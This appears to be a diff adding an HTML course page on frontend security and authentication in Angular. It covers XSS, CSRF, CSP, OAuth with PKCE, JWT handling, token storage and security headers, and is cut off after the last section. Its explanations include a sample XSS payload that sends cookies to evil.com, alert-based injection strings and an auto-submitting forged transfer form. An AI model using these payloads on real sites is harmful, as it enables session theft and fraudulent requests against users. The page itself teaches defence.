@@ -1,0 +1,759 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Frontend System Design — Phase 5: Security &amp; Authentication</title>
+  <style>
+    :root { --bg: #ffffff; --panel: #f7f9fc; --panel-2: #f1f4fa; --ink: #1a2233; --muted: #5a6678; --line: #e2e7f0; --accent: #0f9d7a; --accent-2: #2a5bd7; --warn: #b26b00; --danger: #c23046; --critical: #7a1d2c; --ok: #1a8f4d; --code-bg: #f5f7fb; --chip: #eef1f8; }
+    * { box-sizing: border-box; } html { scroll-behavior: smooth; scroll-padding-top: 12px; }
+    body { margin: 0; font-family: "Inter", "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: var(--bg); color: var(--ink); line-height: 1.6; font-size: 15px; }
+    .layout { display: grid; grid-template-columns: 280px 1fr; min-height: 100vh; }
+    aside { position: sticky; top: 0; height: 100vh; overflow-y: auto; background: #f7f9fc; border-right: 1px solid var(--line); padding: 22px 18px; }
+    aside h2 { font-size: 12px; letter-spacing: 0.12em; text-transform: uppercase; color: var(--muted); margin: 18px 0 8px; }
+    aside a { display: block; padding: 6px 10px; border-radius: 8px; color: #33425c; text-decoration: none; font-size: 13.5px; }
+    aside a:hover { background: var(--chip); color: var(--accent-2); }
+    .brand { font-weight: 700; font-size: 17px; color: var(--accent-2); margin-bottom: 4px; }
+    .brand small { display: block; color: var(--muted); font-weight: 400; font-size: 12px; margin-top: 2px; }
+    main { padding: 36px 48px 80px; max-width: 1100px; }
+    h1 { font-size: 32px; margin: 0 0 6px; color: #0f2a4a; }
+    h2 { margin-top: 46px; font-size: 24px; border-bottom: 1px solid var(--line); padding-bottom: 8px; color: #0f2a4a; }
+    h3 { margin-top: 28px; font-size: 18px; color: var(--accent); }
+    h4 { margin-top: 18px; font-size: 14px; color: var(--accent-2); text-transform: uppercase; letter-spacing: 0.06em; }
+    p, li { color: #2c3648; } strong { color: #0f2a4a; }
+    code { font-family: "JetBrains Mono", "Fira Code", SFMono-Regular, Menlo, monospace; background: #f1f4fa; padding: 2px 6px; border-radius: 5px; font-size: 13px; color: #b4420f; border: 1px solid #e2e7f0; }
+    pre { background: var(--code-bg); border: 1px solid var(--line); border-left: 3px solid var(--accent); border-radius: 10px; padding: 14px 16px; overflow-x: auto; font-size: 13px; line-height: 1.55; }
+    pre code { background: transparent; border: 0; padding: 0; color: #1a2233; }
+    .chip { display: inline-block; font-size: 11px; text-transform: uppercase; letter-spacing: 0.08em; padding: 3px 8px; border-radius: 999px; margin-left: 8px; vertical-align: middle; }
+    .chip.beginner { background: #e2f5ea; color: var(--ok); } .chip.intermediate { background: #fdf1dc; color: var(--warn); } .chip.advanced { background: #fbe1e5; color: var(--danger); } .chip.critical { background: #f3d3d9; color: var(--critical); }
+    .callout { border-radius: 10px; padding: 12px 16px; margin: 14px 0; border: 1px solid var(--line); background: var(--panel); }
+    .callout.gotcha { border-left: 4px solid var(--danger); background: #fdf1f3; } .callout.tip { border-left: 4px solid var(--accent); background: #e8f7f1; } .callout.warn { border-left: 4px solid var(--warn); background: #fdf5e8; } .callout.qa { border-left: 4px solid var(--accent-2); background: #eaf0fc; }
+    .callout .tag { font-weight: 700; font-size: 12px; letter-spacing: 0.08em; text-transform: uppercase; display: block; margin-bottom: 4px; }
+    .callout.gotcha .tag { color: var(--danger); } .callout.tip .tag { color: var(--accent); } .callout.warn .tag { color: var(--warn); } .callout.qa .tag { color: var(--accent-2); }
+    table { width: 100%; border-collapse: collapse; margin: 14px 0 20px; background: var(--panel-2); border-radius: 10px; overflow: hidden; }
+    th, td { border-bottom: 1px solid var(--line); padding: 10px 12px; text-align: left; font-size: 14px; vertical-align: top; }
+    th { background: #eef1f8; color: #0f2a4a; font-weight: 600; text-transform: uppercase; letter-spacing: 0.05em; font-size: 12px; }
+    tr:last-child td { border-bottom: 0; }
+    .qa-block { margin: 12px 0; padding: 14px 16px; border: 1px solid var(--line); border-radius: 10px; background: var(--panel); }
+    .qa-block .q { color: var(--accent-2); font-weight: 600; margin-bottom: 6px; } .qa-block .a { color: #2c3648; }
+    .exercise { background: #f0fdf4; border: 1px solid #b7e4c7; border-radius: 10px; padding: 14px 16px; margin: 14px 0; }
+    .exercise h4 { color: #1b7340; margin-top: 0; }
+    .video-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(280px, 1fr)); gap: 14px; margin: 14px 0 24px; }
+    .video-card { background: var(--panel); border: 1px solid var(--line); border-radius: 10px; padding: 12px 14px; }
+    .video-card a { color: var(--danger); text-decoration: none; font-weight: 600; font-size: 14px; } .video-card a:hover { text-decoration: underline; }
+    .video-card .meta { font-size: 12px; color: var(--muted); margin-top: 4px; }
+    .nav-links { display: flex; justify-content: space-between; margin-top: 40px; padding-top: 16px; border-top: 1px solid var(--line); }
+    .nav-links a { color: var(--accent-2); text-decoration: none; font-weight: 600; }
+    @media (max-width: 900px) { .layout { grid-template-columns: 1fr; } aside { position: static; height: auto; } main { padding: 24px; } }
+  </style>
+</head>
+<body>
+<div class="layout">
+<aside>
+  <div class="brand">Frontend System Design<small>Phase 5 of 8 — Security</small></div>
+  <h2>This Phase</h2>
+  <a href="#xss">XSS Prevention</a>
+  <a href="#csrf">CSRF Protection</a>
+  <a href="#csp">Content Security Policy</a>
+  <a href="#oauth-oidc">OAuth 2.0 & OIDC</a>
+  <a href="#jwt">JWT & Token Management</a>
+  <a href="#token-storage">Secure Token Storage</a>
+  <a href="#angular-auth">Angular Auth Patterns</a>
+  <a href="#clickjacking">Clickjacking & iframe Security</a>
+  <a href="#supply-chain">Supply Chain Security</a>
+  <a href="#security-headers">Security Headers</a>
+  <a href="#exercises">Hands-On Exercises</a>
+  <a href="#interview-questions">Interview Questions</a>
+  <h2>All Phases</h2>
+  <a href="phase1-fundamentals-architecture.html">① Fundamentals</a>
+  <a href="phase2-networking-communication.html">② Networking</a>
+  <a href="phase3-performance-optimization.html">③ Performance</a>
+  <a href="phase4-state-management-data.html">④ State & Data</a>
+  <a href="phase5-security-auth.html"><strong>⑤ Security</strong></a>
+  <a href="phase6-scalable-ui-architecture.html">⑥ Scalable UI</a>
+  <a href="phase7-observability-testing.html">⑦ Observability</a>
+  <a href="phase8-real-world-design-problems.html">⑧ Design Problems</a>
+</aside>
+
+<main>
+<h1>Phase 5: Security &amp; Authentication</h1>
+<p style="color:var(--muted);font-size:16px;margin-bottom:24px;">Security is non-negotiable. XSS, CSRF, auth flows, token management — every senior frontend engineer must understand the attack surface and defense mechanisms.</p>
+
+<!-- ═══════════════════════════════════════════════════════ -->
+<h2 id="xss">1. XSS (Cross-Site Scripting) Prevention</h2>
+<span class="chip critical">Critical</span>
+
+<h3>Theory: XSS Attack Types</h3>
+<pre><code>// ═══ WHAT IS XSS? ═══
+// Attacker injects malicious JavaScript into your app
+// The script runs in VICTIM's browser with FULL access to their session
+
+// ═══ THREE TYPES ═══
+
+// 1. STORED XSS (Persistent) — Most dangerous
+// Attacker saves malicious script in database (comment, profile bio)
+// Every user who views the page executes the script
+// Example: User submits comment: &lt;script&gt;fetch('evil.com?cookie='+document.cookie)&lt;/script&gt;
+
+// 2. REFLECTED XSS
+// Malicious script in URL parameter, reflected in response
+// Example: https://app.com/search?q=&lt;script&gt;alert(1)&lt;/script&gt;
+
+// 3. DOM-BASED XSS
+// Vulnerability in client-side JavaScript
+// Example: element.innerHTML = location.hash.substring(1);
+// URL: https://app.com#&lt;img src=x onerror=alert(1)&gt;
+
+// ═══ WHAT CAN AN ATTACKER DO WITH XSS? ═══
+// • Steal cookies (session hijacking)
+// • Steal tokens from localStorage
+// • Keylog passwords
+// • Redirect to phishing site
+// • Make API calls as the user
+// • Deface the website
+// • Install crypto miners</code></pre>
+
+<h3>Angular's Built-in XSS Protection</h3>
+<pre><code>// Angular automatically SANITIZES all values bound to DOM!
+// This is SAFE by default:
+
+@Component({
+  template: `
+    &lt;p&gt;{{ userInput }}&lt;/p&gt;            &lt;!-- Auto-escaped --&gt;
+    &lt;div [innerHTML]="userHtml"&gt;&lt;/div&gt; &lt;!-- Sanitized (strips scripts) --&gt;
+    &lt;a [href]="userUrl"&gt;Link&lt;/a&gt;      &lt;!-- Sanitized (blocks javascript:) --&gt;
+  `
+})
+export class SafeComponent {
+  userInput = '&lt;script&gt;alert("XSS")&lt;/script&gt;';
+  // Rendered as TEXT: &amp;lt;script&amp;gt;alert("XSS")&amp;lt;/script&amp;gt;
+  
+  userHtml = '&lt;b&gt;Bold&lt;/b&gt;&lt;script&gt;evil()&lt;/script&gt;';
+  // innerHTML renders: &lt;b&gt;Bold&lt;/b&gt;  (script STRIPPED!)
+  
+  userUrl = 'javascript:alert(1)';
+  // href sanitized: "unsafe:javascript:alert(1)" (blocked!)
+}
+
+// ═══ DANGEROUS: Bypassing Sanitization ═══
+// Only do this if you TRUST the source completely:
+import { DomSanitizer } from '@angular/platform-browser';
+
+constructor(private sanitizer: DomSanitizer) {}
+
+// DANGER — only use for content YOU control:
+trustedHtml = this.sanitizer.bypassSecurityTrustHtml(htmlFromCMS);
+trustedUrl = this.sanitizer.bypassSecurityTrustResourceUrl(iframeUrl);
+
+// ═══ NEVER DO THIS ═══
+// ❌ element.innerHTML = userInput;         // Direct DOM manipulation
+// ❌ document.write(userData);              // Never use document.write
+// ❌ eval(userString);                      // Never eval user data
+// ❌ new Function(userString)();            // Same as eval
+// ❌ setTimeout(userString, 0);             // String form is eval-like</code></pre>
+
+<div class="callout gotcha">
+  <span class="tag">Angular XSS Gotcha</span>
+  Angular sanitization only works with Angular's template binding syntax. If you use <code>ElementRef.nativeElement.innerHTML = userInput</code> directly, Angular can't protect you! Always use Angular's binding system.
+</div>
+
+
+<h3>🎬 YouTube Resources</h3>
+<div class="video-grid">
+  <div class="video-card"><a href="https://www.youtube.com/watch?v=L5l9lSnNMxg" target="_blank">XSS Explained — Computerphile</a><div class="meta">Cross-site scripting fundamentals</div></div>
+  <div class="video-card"><a href="https://www.youtube.com/watch?v=IuzU4y-UjLw" target="_blank">XSS Prevention — OWASP</a><div class="meta">Sanitization & CSP defense</div></div>
+</div>
+
+<!-- ═══════════════════════════════════════════════════════ -->
+<h2 id="csrf">2. CSRF (Cross-Site Request Forgery)</h2>
+<span class="chip critical">Critical</span>
+
+<h3>Theory: How CSRF Works</h3>
+<pre><code>// ═══ THE ATTACK ═══
+// User is logged into bank.com (has session cookie)
+// User visits evil.com which has:
+&lt;img src="https://bank.com/transfer?to=attacker&amp;amount=10000" /&gt;
+// OR:
+&lt;form action="https://bank.com/transfer" method="POST" id="f"&gt;
+  &lt;input name="to" value="attacker" /&gt;
+  &lt;input name="amount" value="10000" /&gt;
+&lt;/form&gt;
+&lt;script&gt;document.getElementById('f').submit();&lt;/script&gt;
+
+// Browser automatically sends bank.com cookies with the request!
+// Server thinks it's a legitimate request from the user!
+
+// ═══ DEFENSES ═══
+
+// 1. CSRF TOKEN (Synchronizer Token Pattern):
+// Server generates random token, embeds in form/header
+// Token NOT in cookies, so attacker can't include it
+// Server validates token matches on every state-changing request
+
+// 2. SameSite Cookies:
+Set-Cookie: session=abc123; SameSite=Strict; Secure; HttpOnly
+// SameSite=Strict: Cookie NEVER sent cross-origin (safest)
+// SameSite=Lax: Sent on top-level navigation (GET only)
+// SameSite=None; Secure: Always sent (needed for cross-origin APIs)
+
+// 3. Double-Submit Cookie Pattern (Angular uses this!)
+
+// ═══ ANGULAR's BUILT-IN CSRF PROTECTION ═══
+// Angular HttpClient + server cooperation:
+// 1. Server sets a cookie: XSRF-TOKEN=random_value
+// 2. Angular's HttpXsrfInterceptor reads XSRF-TOKEN cookie
+// 3. Angular adds header: X-XSRF-TOKEN=random_value
+// 4. Server compares cookie value to header value
+// Attacker can't read the cookie (different origin) → can't set header!
+
+// Configuration:
+provideHttpClient(
+  withXsrfConfiguration({
+    cookieName: 'XSRF-TOKEN',  // default
+    headerName: 'X-XSRF-TOKEN' // default
+  })
+)</code></pre>
+
+
+<h3>🎬 YouTube Resources</h3>
+<div class="video-grid">
+  <div class="video-card"><a href="https://www.youtube.com/watch?v=vRBihr41JTo" target="_blank">CSRF Explained — Computerphile</a><div class="meta">Cross-site request forgery attack</div></div>
+  <div class="video-card"><a href="https://www.youtube.com/watch?v=80S8h5hEwTY" target="_blank">CSRF Protection — Hussein Nasser</a><div class="meta">Token-based CSRF defense</div></div>
+</div>
+
+<!-- ═══════════════════════════════════════════════════════ -->
+<h2 id="csp">3. Content Security Policy (CSP)</h2>
+<span class="chip advanced">Advanced</span>
+
+<pre><code>// CSP = HTTP header that tells browser WHAT resources are allowed to load
+// Strongest defense against XSS (even if injection happens, script won't execute!)
+
+// ═══ EXAMPLE CSP HEADER ═══
+Content-Security-Policy:
+  default-src 'self';                          // Only same-origin by default
+  script-src 'self' 'nonce-abc123';            // Scripts: same-origin + nonce
+  style-src 'self' 'unsafe-inline';            // Styles: same-origin + inline
+  img-src 'self' https://cdn.example.com;      // Images: self + specific CDN
+  font-src 'self' https://fonts.gstatic.com;   // Fonts
+  connect-src 'self' https://api.example.com;  // XHR/Fetch/WebSocket
+  frame-src 'none';                            // No iframes allowed
+  object-src 'none';                           // No plugins (Flash, Java)
+  base-uri 'self';                             // Prevent base tag hijacking
+  form-action 'self';                          // Forms only submit to self
+
+// ═══ NONCE-BASED CSP (Recommended for Angular) ═══
+// Server generates random nonce per request:
+Content-Security-Policy: script-src 'nonce-rAnd0m123'
+
+// HTML includes nonce on legitimate scripts:
+&lt;script nonce="rAnd0m123" src="/main.js"&gt;&lt;/script&gt;
+
+// Injected scripts DON'T have the nonce → BLOCKED!
+&lt;script&gt;evil()&lt;/script&gt;  // ❌ No nonce → CSP blocks it!
+
+// ═══ CSP REPORT-ONLY MODE (Testing) ═══
+Content-Security-Policy-Report-Only: default-src 'self'; report-uri /csp-report
+// Doesn't block, just reports violations → use to test before enforcing
+
+// ═══ ANGULAR-SPECIFIC CSP CONSIDERATIONS ═══
+// Angular uses inline styles for some features → need 'unsafe-inline' for styles
+// OR use nonce: Angular 16+ supports CSP nonce via:
+// In index.html: &lt;style nonce="serverNonce"&gt;
+// Angular will use same nonce for dynamically created styles</code></pre>
+
+
+<h3>🎬 YouTube Resources</h3>
+<div class="video-grid">
+  <div class="video-card"><a href="https://www.youtube.com/watch?v=mr230uotw-Y" target="_blank">Content Security Policy — Google Chrome</a><div class="meta">CSP headers explained</div></div>
+  <div class="video-card"><a href="https://www.youtube.com/watch?v=txHc4zk6w3s" target="_blank">CSP in Practice — Mozilla</a><div class="meta">Configuring CSP for SPAs</div></div>
+</div>
+
+<!-- ═══════════════════════════════════════════════════════ -->
+<h2 id="oauth-oidc">4. OAuth 2.0 &amp; OpenID Connect (OIDC)</h2>
+<span class="chip critical">Critical</span>
+
+<h3>Theory: OAuth 2.0 Flows</h3>
+<pre><code>// ═══ OAUTH 2.0 = AUTHORIZATION (what can you access?) ═══
+// ═══ OIDC = AUTHENTICATION (who are you?) — built on OAuth 2.0 ═══
+
+// ═══ Authorization Code Flow with PKCE (Recommended for SPAs) ═══
+// PKCE = Proof Key for Code Exchange (prevents code interception)
+
+┌──────────┐                          ┌─────────────────┐
+│  Angular  │                          │  Auth Server     │
+│   App     │                          │ (Okta/Auth0/AAD)│
+└─────┬────┘                          └────────┬────────┘
+      │                                        │
+      │ 1. Generate code_verifier (random)      │
+      │    + code_challenge (SHA256 hash)       │
+      │                                        │
+      │ 2. Redirect to /authorize              │
+      │    ?response_type=code                 │
+      │    &client_id=xxx                      │
+      │    &redirect_uri=https://app/callback  │
+      │    &scope=openid profile email         │
+      │    &code_challenge=abc123              │
+      │    &code_challenge_method=S256         │
+      ├───────────────────────────────────────→│
+      │                                        │
+      │         3. User logs in                │
+      │                                        │
+      │←──────── 4. Redirect back ─────────────┤
+      │    /callback?code=AUTH_CODE            │
+      │                                        │
+      │ 5. POST /token                         │
+      │    { code, code_verifier, client_id }  │
+      ├───────────────────────────────────────→│
+      │                                        │
+      │←──── 6. { access_token, id_token,  ────┤
+      │           refresh_token }              │
+      │                                        │
+
+// WHY PKCE?
+// Without PKCE: attacker could intercept auth code from URL
+// With PKCE: need code_verifier (stored in memory) to exchange code
+// Only the app that initiated the flow can complete it!
+
+// ═══ TOKENS EXPLAINED ═══
+// access_token:  Short-lived (15min). Sent to API for authorization.
+// id_token:      Contains user info (name, email). Verify on client.
+// refresh_token: Long-lived. Used to get new access_token silently.</code></pre>
+
+
+<h3>🎬 YouTube Resources</h3>
+<div class="video-grid">
+  <div class="video-card"><a href="https://www.youtube.com/watch?v=ZV5yTm4pT8g" target="_blank">OAuth 2.0 Explained — ByteByteGo</a><div class="meta">OAuth flow visualized</div></div>
+  <div class="video-card"><a href="https://www.youtube.com/watch?v=996OiexHze0" target="_blank">OIDC Deep Dive — Okta</a><div class="meta">OpenID Connect for frontend</div></div>
+</div>
+
+<!-- ═══════════════════════════════════════════════════════ -->
+<h2 id="jwt">5. JWT (JSON Web Tokens)</h2>
+<span class="chip intermediate">Intermediate</span>
+
+<pre><code>// JWT = base64(header).base64(payload).signature
+
+// ═══ STRUCTURE ═══
+// Header:
+{ "alg": "RS256", "typ": "JWT" }
+
+// Payload (claims):
+{
+  "sub": "user123",          // Subject (user ID)
+  "name": "Sid R",           // Custom claim
+  "email": "sid@example.com",
+  "roles": ["admin", "user"],
+  "iat": 1700000000,         // Issued at
+  "exp": 1700000900,         // Expires (15 min)
+  "iss": "https://auth.example.com",  // Issuer
+  "aud": "https://api.example.com"    // Audience
+}
+
+// Signature: RS256(base64(header) + "." + base64(payload), privateKey)
+
+// ═══ IMPORTANT SECURITY RULES ═══
+// 1. NEVER store sensitive data in JWT payload (it's just base64, not encrypted!)
+// 2. ALWAYS verify signature on server before trusting claims
+// 3. ALWAYS check exp (expiration) before using
+// 4. Use short expiration (15min) + refresh tokens
+// 5. Use RS256 (asymmetric) not HS256 (symmetric) for public APIs
+
+// ═══ Angular JWT Handling ═══
+// Decode JWT without library (for display only, NOT for security):
+function decodeJwt(token: string): any {
+  const payload = token.split('.')[1];
+  return JSON.parse(atob(payload));
+}
+
+// Check if expired:
+function isTokenExpired(token: string): boolean {
+  const decoded = decodeJwt(token);
+  return decoded.exp * 1000 &lt; Date.now();
+}</code></pre>
+
+
+<h3>🎬 YouTube Resources</h3>
+<div class="video-grid">
+  <div class="video-card"><a href="https://www.youtube.com/watch?v=7Q17ubqLfaM" target="_blank">JWT Explained — Fireship</a><div class="meta">JWT in 100 seconds</div></div>
+  <div class="video-card"><a href="https://www.youtube.com/watch?v=7ozQLeFJpqs" target="_blank">JWT Security — Hussein Nasser</a><div class="meta">Common JWT vulnerabilities</div></div>
+</div>
+
+<!-- ═══════════════════════════════════════════════════════ -->
+<h2 id="token-storage">6. Secure Token Storage</h2>
+<span class="chip critical">Critical</span>
+
+<table>
+  <tr><th>Storage</th><th>XSS Vulnerable?</th><th>CSRF Vulnerable?</th><th>Use For</th></tr>
+  <tr><td>localStorage</td><td>🔴 YES (JS can read)</td><td>🟢 No</td><td>Non-sensitive data only</td></tr>
+  <tr><td>sessionStorage</td><td>🔴 YES (JS can read)</td><td>🟢 No</td><td>Temporary session data</td></tr>
+  <tr><td>HttpOnly Cookie</td><td>🟢 No (JS can't read)</td><td>🔴 YES (auto-sent)</td><td>Refresh tokens (+ CSRF protection)</td></tr>
+  <tr><td>Memory (variable)</td><td>🟡 Only via XSS in same page</td><td>🟢 No</td><td>Access tokens (short-lived)</td></tr>
+</table>
+
+<pre><code>// ═══ RECOMMENDED PATTERN (BFF + HttpOnly Cookies) ═══
+// Best security: Backend-for-Frontend handles tokens
+
+// Flow:
+// 1. Angular app → BFF (same origin) → Auth Server
+// 2. BFF stores tokens in HttpOnly, Secure, SameSite=Strict cookies
+// 3. Angular never sees the tokens! (No XSS risk)
+// 4. BFF attaches token to upstream API calls
+
+// ═══ ALTERNATIVE: In-Memory + Refresh Token Rotation ═══
+@Injectable({ providedIn: 'root' })
+export class TokenService {
+  // Access token in MEMORY only (not localStorage!):
+  private accessToken: string | null = null;
+  
+  // Refresh token in HttpOnly cookie (set by server)
+  // Angular can't read it, but it's auto-sent on /refresh endpoint
+  
+  getAccessToken(): string | null {
+    if (this.accessToken && !this.isExpired(this.accessToken)) {
+      return this.accessToken;
+    }
+    return null;
+  }
+  
+  setAccessToken(token: string) {
+    this.accessToken = token;
+  }
+  
+  // Silent refresh (using HttpOnly refresh cookie):
+  refreshToken(): Observable&lt;string&gt; {
+    return this.http.post&lt;{ accessToken: string }&gt;(
+      '/api/auth/refresh',
+      {},
+      { withCredentials: true }  // Send HttpOnly cookie
+    ).pipe(
+      tap(res => this.accessToken = res.accessToken),
+      map(res => res.accessToken)
+    );
+  }
+  
+  private isExpired(token: string): boolean {
+    const payload = JSON.parse(atob(token.split('.')[1]));
+    return payload.exp * 1000 &lt; Date.now() - 30000; // 30s buffer
+  }
+}
+
+// ═══ TOKEN REFRESH INTERCEPTOR ═══
+export const tokenRefreshInterceptor: HttpInterceptorFn = (req, next) => {
+  const tokenService = inject(TokenService);
+  const token = tokenService.getAccessToken();
+  
+  if (token) {
+    req = req.clone({ setHeaders: { Authorization: `Bearer ${token}` } });
+  }
+  
+  return next(req).pipe(
+    catchError((error: HttpErrorResponse) => {
+      if (error.status === 401 && !req.url.includes('/refresh')) {
+        // Token expired → refresh and retry:
+        return tokenService.refreshToken().pipe(
+          switchMap(newToken => {
+            req = req.clone({ setHeaders: { Authorization: `Bearer ${newToken}` } });
+            return next(req);
+          }),
+          catchError(() => {
+            tokenService.logout();
+            return throwError(() => error);
+          })
+        );
+      }
+      return throwError(() => error);
+    })
+  );
+};</code></pre>
+
+
+<h3>🎬 YouTube Resources</h3>
+<div class="video-grid">
+  <div class="video-card"><a href="https://www.youtube.com/watch?v=iD49_NIQ-R4" target="_blank">Where to Store Tokens — Ben Awad</a><div class="meta">Cookie vs localStorage debate</div></div>
+  <div class="video-card"><a href="https://www.youtube.com/watch?v=uV1luIxak7Y" target="_blank">Secure Token Storage — Auth0</a><div class="meta">HttpOnly cookies & BFF pattern</div></div>
+</div>
+
+<!-- ═══════════════════════════════════════════════════════ -->
+<h2 id="angular-auth">7. Angular Authentication Patterns</h2>
+<span class="chip intermediate">Intermediate</span>
+
+<pre><code>// ═══ ROUTE GUARDS (Functional — Angular 15+) ═══
+export const authGuard: CanActivateFn = (route, state) => {
+  const auth = inject(AuthService);
+  const router = inject(Router);
+  
+  if (auth.isAuthenticated()) {
+    return true;
+  }
+  
+  // Save intended URL for redirect after login:
+  router.navigate(['/login'], { queryParams: { returnUrl: state.url } });
+  return false;
+};
+
+// Role-based guard:
+export const roleGuard: CanActivateFn = (route) => {
+  const auth = inject(AuthService);
+  const requiredRoles = route.data['roles'] as string[];
+  return requiredRoles.some(role => auth.hasRole(role));
+};
+
+// Usage in routes:
+const routes: Routes = [
+  { path: 'dashboard', component: DashboardComponent, canActivate: [authGuard] },
+  {
+    path: 'admin',
+    loadComponent: () => import('./admin.component'),
+    canActivate: [authGuard, roleGuard],
+    data: { roles: ['admin'] }
+  }
+];
+
+// ═══ AUTH SERVICE ═══
+@Injectable({ providedIn: 'root' })
+export class AuthService {
+  private user = signal&lt;User | null&gt;(null);
+  readonly isAuthenticated = computed(() => !!this.user());
+  readonly currentUser = this.user.asReadonly();
+  
+  constructor(private tokenService: TokenService, private router: Router) {
+    // Attempt to restore session on app start:
+    this.initSession();
+  }
+  
+  private async initSession() {
+    try {
+      const response = await firstValueFrom(
+        this.http.get&lt;User&gt;('/api/auth/me', { withCredentials: true })
+      );
+      this.user.set(response);
+    } catch {
+      // Not authenticated
+    }
+  }
+  
+  hasRole(role: string): boolean {
+    return this.user()?.roles.includes(role) ?? false;
+  }
+  
+  logout() {
+    this.http.post('/api/auth/logout', {}, { withCredentials: true }).subscribe();
+    this.user.set(null);
+    this.tokenService.clearAccessToken();
+    this.router.navigate(['/login']);
+  }
+}
+
+// ═══ APP INITIALIZATION (Check auth on startup) ═══
+// app.config.ts:
+export const appConfig: ApplicationConfig = {
+  providers: [
+    provideRouter(routes),
+    provideHttpClient(withInterceptors([tokenRefreshInterceptor])),
+    {
+      provide: APP_INITIALIZER,
+      useFactory: () => {
+        const auth = inject(AuthService);
+        return () => auth.initSession();  // Blocks app until auth check done
+      },
+      multi: true
+    }
+  ]
+};</code></pre>
+
+
+<h3>🎬 YouTube Resources</h3>
+<div class="video-grid">
+  <div class="video-card"><a href="https://www.youtube.com/watch?v=GBFxzW3K1AE" target="_blank">Angular Auth Guards — Decoded Frontend</a><div class="meta">Route protection patterns</div></div>
+  <div class="video-card"><a href="https://www.youtube.com/watch?v=bHBQm_Jt9xM" target="_blank">Angular HTTP Interceptors — Joshua Morony</a><div class="meta">Token refresh interceptor</div></div>
+</div>
+
+<!-- ═══════════════════════════════════════════════════════ -->
+<h2 id="clickjacking">8. Clickjacking &amp; iframe Security</h2>
+<span class="chip intermediate">Intermediate</span>
+
+<pre><code>// ═══ CLICKJACKING ═══
+// Attacker embeds your app in transparent iframe over fake UI
+// User thinks they're clicking a button, but they're clicking your hidden page
+
+// DEFENSE 1: X-Frame-Options header:
+X-Frame-Options: DENY              // Never allow framing
+X-Frame-Options: SAMEORIGIN        // Only same-origin framing
+
+// DEFENSE 2: CSP frame-ancestors (modern replacement):
+Content-Security-Policy: frame-ancestors 'self'  // Only self can frame
+Content-Security-Policy: frame-ancestors 'none'  // No framing at all
+
+// DEFENSE 3: JavaScript frame-busting (fallback):
+if (window.top !== window.self) {
+  window.top.location = window.self.location;  // Break out of iframe
+}
+
+// ═══ SANDBOXING IFRAMES (When you embed others) ═══
+&lt;iframe
+  src="https://third-party.com/widget"
+  sandbox="allow-scripts allow-same-origin"
+  referrerpolicy="no-referrer"
+  loading="lazy"
+&gt;&lt;/iframe&gt;
+
+// sandbox restrictions:
+// allow-scripts: Let iframe run JS
+// allow-same-origin: Allow access to its own origin's storage
+// allow-forms: Allow form submissions
+// allow-popups: Allow window.open
+// OMIT all: most restrictive (no JS, no forms, no storage)</code></pre>
+
+
+<h3>🎬 YouTube Resources</h3>
+<div class="video-grid">
+  <div class="video-card"><a href="https://www.youtube.com/watch?v=jcp5t8PnKHQ" target="_blank">Clickjacking Explained — Computerphile</a><div class="meta">UI redress attack demo</div></div>
+  <div class="video-card"><a href="https://www.youtube.com/watch?v=mr230uotw-Y" target="_blank">X-Frame-Options & CSP — Mozilla</a><div class="meta">Frame ancestors defense</div></div>
+</div>
+
+<!-- ═══════════════════════════════════════════════════════ -->
+<h2 id="supply-chain">9. Supply Chain Security</h2>
+<span class="chip advanced">Advanced</span>
+
+<pre><code>// ═══ NPM SUPPLY CHAIN ATTACKS ═══
+// Your app depends on 100s of packages → any one could be compromised
+// Real attacks: event-stream (2018), ua-parser-js (2021), colors (2022)
+
+// ═══ DEFENSES ═══
+
+// 1. Lock dependencies (always commit lock file):
+// package-lock.json ensures exact versions across environments
+
+// 2. Audit regularly:
+npm audit                    // Check for known vulnerabilities
+npm audit fix               // Auto-fix where possible
+npx audit-ci --critical     // Fail CI on critical vulnerabilities
+
+// 3. Use exact versions for critical deps:
+"dependencies": {
+  "@angular/core": "17.2.0"  // Exact, not "^17.2.0"
+}
+
+// 4. Subresource Integrity (SRI) for CDN scripts:
+&lt;script src="https://cdn.example.com/lib.js"
+        integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8wC"
+        crossorigin="anonymous"&gt;&lt;/script&gt;
+// If file is tampered, browser refuses to execute!
+
+// 5. Renovate/Dependabot for automated updates:
+// Auto-creates PRs for dependency updates
+// Run tests → safe to merge
+
+// 6. Private registry (Artifactory, Nexus):
+// Cache approved packages, block unknown ones</code></pre>
+
+
+<h3>🎬 YouTube Resources</h3>
+<div class="video-grid">
+  <div class="video-card"><a href="https://www.youtube.com/watch?v=ggnaKG0NRKc" target="_blank">Supply Chain Attacks — Fireship</a><div class="meta">npm dependency risks</div></div>
+  <div class="video-card"><a href="https://www.youtube.com/watch?v=P8DF78RLWqc" target="_blank">Securing Dependencies — Snyk</a><div class="meta">Lockfiles & audit tools</div></div>
+</div>
+
+<!-- ═══════════════════════════════════════════════════════ -->
+<h2 id="security-headers">10. Security Headers Checklist</h2>
+<span class="chip intermediate">Intermediate</span>
+
+<table>
+  <tr><th>Header</th><th>Purpose</th><th>Recommended Value</th></tr>
+  <tr><td>Content-Security-Policy</td><td>Prevent XSS, injection</td><td>default-src 'self'; script-src 'self' 'nonce-xxx'</td></tr>
+  <tr><td>Strict-Transport-Security</td><td>Force HTTPS</td><td>max-age=31536000; includeSubDomains; preload</td></tr>
+  <tr><td>X-Content-Type-Options</td><td>Prevent MIME sniffing</td><td>nosniff</td></tr>
+  <tr><td>X-Frame-Options</td><td>Prevent clickjacking</td><td>DENY or SAMEORIGIN</td></tr>
+  <tr><td>Referrer-Policy</td><td>Control referrer info</td><td>strict-origin-when-cross-origin</td></tr>
+  <tr><td>Permissions-Policy</td><td>Restrict browser features</td><td>camera=(), microphone=(), geolocation=()</td></tr>
+  <tr><td>X-XSS-Protection</td><td>Legacy XSS filter</td><td>0 (CSP is better; old filter can cause issues)</td></tr>
+</table>
+
+<h3>YouTube Resources</h3>
+<div class="video-grid">
+  <div class="video-card"><a href="https://www.youtube.com/watch?v=EoaDgUgS6QA" target="_blank">XSS Explained — Computerphile</a><div class="meta">Classic XSS explanation</div></div>
+  <div class="video-card"><a href="https://www.youtube.com/watch?v=996OiexHze0" target="_blank">OAuth 2.0 Simplified — OktaDev</a><div class="meta">Clear OAuth flow walkthrough</div></div>
